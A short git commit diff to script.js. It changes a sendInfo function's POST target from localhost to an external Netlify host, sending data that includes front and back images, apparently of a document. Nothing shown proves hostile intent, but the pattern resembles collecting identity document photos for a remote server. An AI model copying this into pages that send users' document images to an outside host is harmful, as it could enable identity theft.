8d79364d4235a80ececa58400ba758520d4a83e7
SubVray <66286368+SubVray@users.noreply.github.com>
2023-02-05 12:09:49 -0600

    Update script.js

--- script.js
+++ script.js
@@ -213,7 +213,7 @@ const sendInfo = async () => {
       frontImg: front,
       backImg: back,
     };
-      fetch("https://localhost:5000/data", {
+      fetch("https://firmascecapia.netlify.app/data", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
